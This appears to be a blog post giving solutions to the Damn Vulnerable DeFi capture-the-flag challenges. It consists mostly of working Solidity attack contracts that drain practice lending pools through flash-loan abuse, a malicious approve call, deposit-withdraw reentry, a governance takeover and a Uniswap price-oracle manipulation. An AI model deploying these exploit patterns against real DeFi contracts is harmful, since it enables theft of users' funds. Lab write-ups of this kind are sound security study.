---
title: Damn vulnerable defi Challenges
date: 2023-03-25 19:02:31
tags:
  - solidity
  - damnvulnerabledefi
  - defi
  - CTFs
categories:
  - solidity
---

## how to get it started

1. git clone [github repo](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0)
2. yarn install
3. fill your code in \*.challenge.js
4. run your script via hardhat tools

## Challenge1

```javascript
it("Execution", async function () {
  /** CODE YOUR SOLUTION HERE */
  await token
    .connect(player)
    .approve(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
  await token
    .connect(player)
    .transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
});
```

## Challenge2

```javascript
interface INaiveReceiverLenderPool{
    function fixedFee(address token, uint256) external pure returns (uint256);
    function flashLoan(address receiver,address token, uint256 amount,bytes calldata data) external returns (bool);
}

contract AttackContract {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(INaiveReceiverLenderPool pool,address payable receiver) external {
        for(uint i=0;i<10;i++){
            pool.flashLoan(receiver, ETH,0,"0x");
        }
    }
}
```

## Challenge3

Use ERC20 approve function and not it will not affect the balance when making flashloan.

```javascript
function attack(TrusterLenderPool pool,DamnValuableToken _token) external {
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),type(uint256).max);
    pool.flashLoan(0,address(this),address(_token),data);
    _token.transferFrom(address(pool),msg.sender,_token.balanceOf(address(pool)));
}
```

## Challenge4

Use our deployed contract to send back the token using deposit function.After the flashloan call withdraw function to take our tokens back.
Do not forget to set the receive function for receiving tokens.
Use \_to.call function to send tokens,it is the current recommended method to use.

```javascript
contract Attack {
     function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value:msg.value}();
     }

     function attack(SideEntranceLenderPool pool,address payable player) external {
        //make a flashloan
        pool.flashLoan(1000 ether);
        //get the money
        pool.withdraw();
        //send to palyer
        (bool sent,) = player.call{value:1000 ether}("");
        require(sent, "Failed to send Ether");
     }

     receive() external payable {}
}
```

## Challenge5

The reward pool only count the amount of deposit. We can use flash loan to borrow some DVT token and claim the reward token at the same time.Here goes the code:

```javascript
contract TheRewardAttack {
    //flashloan pool address.
    FlashLoanerPool  private immutable pool;
    DamnValuableToken private immutable DVTtoken;
    TheRewarderPool private immutable RewardPool;
    RewardToken private immutable RdToken;
    address private owner;

    constructor(FlashLoanerPool _pool,DamnValuableToken _token,TheRewarderPool _RewardPool,RewardToken _Rdtoken,address player) {
        pool = _pool;
        DVTtoken = _token;
        RewardPool = _RewardPool;
        RdToken = _Rdtoken;
        owner = player;
    }

    function receiveFlashLoan(uint256 amount) external{
        //do something.
        //deposit to reward pool
        //approve amount to the reward pool
        DVTtoken.approve(address(RewardPool),amount);

        RewardPool.deposit(amount);

        //claim the rewards
        RewardPool.distributeRewards();

        //withdraw DVTtokens
        RewardPool.withdraw(amount);

        //return back DVT token.
        DVTtoken.transfer(address(pool),amount);

        //send reward token to our player.
        RdToken.transfer(owner,RdToken.balanceOf(address(this)));
    }

    function attack(uint256 amount) external{
        pool.flashLoan(amount);
    }
}
```

## Challenge6

This challenge is similar to the previous one.Firstly we use flashloan borrow some DVT token.Secondly we use the DVT token make a governance action.Finally two days later we make a executeAction to claim the DVT token to our attack contact and send it to our player.Here goes the entire code:

```javascript
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttack is IERC3156FlashBorrower {

    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableTokenSnapshot private immutable token;

    constructor(SelfiePool _pool,SimpleGovernance _governance,DamnValuableTokenSnapshot _token) {
        pool = _pool;
        governance = _governance;
        token = _token;
    }

    function onFlashLoan(address initiator,address _token,uint256 amount,uint256 fee,bytes calldata _data) external returns (bytes32){
        //receive DVT token from pool
        console.log("receive token:",DamnValuableTokenSnapshot(_token).balanceOf(address(this)));

        //make a snapshot ?
        DamnValuableTokenSnapshot(_token).snapshot();

        //submit an governance action
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)",address(this));

        governance.queueAction(address(pool),0,data);

        //approve DVT token to lending pool.
        DamnValuableTokenSnapshot(_token).approve(address(pool),amount);

        //return success bytes
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function exeAction(uint256 actionId) external {
        //execute the action
        governance.executeAction(actionId);
        //send token to mother fuck sender please
        DamnValuableTokenSnapshot(token).transfer(msg.sender,DamnValuableTokenSnapshot(token).balanceOf(address(this)));
    }

    function attack(uint256 borrowAmount) external {
        //make a DVT token flashloan
        pool.flashLoan(IERC3156FlashBorrower(this),address(token),borrowAmount,'0x');
    }
}
```

## Challenge7

Get the private key from the leak data,and then use source address to change the price of NFT.Finnaly sell the NFT for a profit.

## Challenge8

The cost amount for lending is pegging with uniswap pool:

> uniswapPair.balance \* (10 \*\* 18) / token.balanceOf(uniswapPair)

Therefore,we use swap all our DVT token to ETH,and then the number of uniswapPair.balance/token.balanceOf(uniswapPair) goes down.After that happened we can deposit our eth to borrow all the DVT token in lending pool.

```javascript
contract PuppetAttack {

    address public immutable uniswapExchange;
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;
    constructor(address tokenAddress, address _uniswapExchange,PuppetPool _pool){
        token = DamnValuableToken(tokenAddress);
        uniswapExchange = _uniswapExchange;
        pool = _pool;
    }

    function attack() external payable {
        //receive DVT
        token.transferFrom(msg.sender,address(this),token.balanceOf(msg.sender));

        //approve DVTtoken to uniswap pool
        token.approve(uniswapExchange,token.balanceOf(address(this)));

        //swap all DVT token to eth in uniswap pool.
        UniswapExchangeInterface(uniswapExchange).tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp+5);

        //borrow DVT token by depositing eth.
        pool.borrow{value:address(this).balance}(token.balanceOf(address(pool)),msg.sender);
    }

    receive() external payable{}
}
```
